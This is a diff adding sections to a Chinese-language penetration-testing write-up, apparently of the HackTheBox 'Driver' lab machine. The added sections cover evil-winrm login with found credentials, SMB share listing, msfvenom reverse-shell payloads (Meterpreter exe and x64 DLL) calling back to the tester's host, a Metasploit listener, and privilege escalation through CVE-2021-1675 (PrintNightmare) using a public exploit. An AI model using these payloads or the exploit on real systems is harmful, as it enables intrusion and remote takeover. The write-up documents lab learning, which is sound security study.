@@ -84,14 +84,100 @@ exploit
 
 失败，估计是没权限
 
+#### evil-winrm
 
+evil-winrm是Windows远程管理(WinRM) Shell的终极版本。
+
+Windows远程管理是“WS 管理协议的 Microsoft 实施，该协议是基于标准 SOAP、不受防火墙影响的协议，允许不同供应商的硬件和操作系统相互操作。而微软将其包含在他们的系统中，是为了便于系统管理员在日常工作中，远程管理服务器，或通过脚本同时管理多台服务器，以提高他们的工作效率。
+
+此程序可在启用此功能的任何Microsoft Windows服务器上使用（通常端口为5985），当然只有在你具有使用凭据和权限时才能使用。因此，我们说它可用于黑客攻击的后利用/渗透测试阶段。相对于攻击者来说，这个程序能为他们提供更好更简单易用的功能。当然，系统管理员也可以将其用于合法目的，但其大部分功能都集中于黑客攻击/渗透测试。
+
+```
+gem install evil-winrm
+```
+
+基础使用
+
+```
+evil-winrm  -i 10.10.11.106 -u tony -p 'liltony' 
+```
+
+
+
+#### sbmclient 查看共享文件夹
+
+```
+smbclient -L \\\\192.168.0.21\\ -U tony
+```
 
 ### 上传payload获取shell
 
-本方法的主要优点是它不需要与用户有任何交互，并自动强制用户连接到共享，在这个过程中不存在NTLMv2哈希的协商过程。因此，也可以将此技术与SMB中继相结合，SMB中继将提供有效载荷，可以从访问该共享的每个用户检索Meterpreter Shell。
+生成exe payload
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.7 LPORT=445 -f exe > hack.exe
+```
+
+通过 evil-winrm 上传到client上，msf 监听端口
+
+```
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 10.211.55.5
+set LPORT 445
+exploit
+```
+
+![image-20211208142704596](/assets/image-20211208142704596.png)
+
+尝试提权失败
+
+```
+use post/multi/recon/local_exploit_suggester
+set SESSION 2
+run
+```
+
+执行完无反应，暂停测试
 
 
+
+### 使用 CVE-2021-1675 提权
+
+生成 反弹shell Dll,上传到系统上
+
+```bash
+msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=<My IP> LPORT=8000 -f dll -o dll.dll
+```
+
+使用项目  https://github.com/cube0x0/CVE-2021-1675 
+
+执行命令
+
+```bash
+python3 CVE-2021-1675.py driver.htb/tony:passwd@10.10.11.106 'C:\Users\tony\Documents\dll.dll'
+```
+
+监听端口
+
+```
+nc -lvvp 8000
+```
+
+![image-20211208164615041](/assets/image-20211208164615041.png)
+
+收到反弹shell
+
+![image-20211208164747127](/assets/image-20211208164747127.png)
+
+ 
+
+## 总结
+
+我这个菜鸡接触了一个全新的领域，学习了一波知识。但没有系统的概念，导致看到端口也想不出来存在漏洞。还是需要更多的沉淀，学习。多学习window及域相关安全，才能更好做好工作，提升个人能力短板。
 
 ## 参考资料
 
 - https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/
+- https://www.freebuf.com/sectool/210479.html
+- https://baijiahao.baidu.com/s?id=1714776706313648285&wfr=spider&for=pc
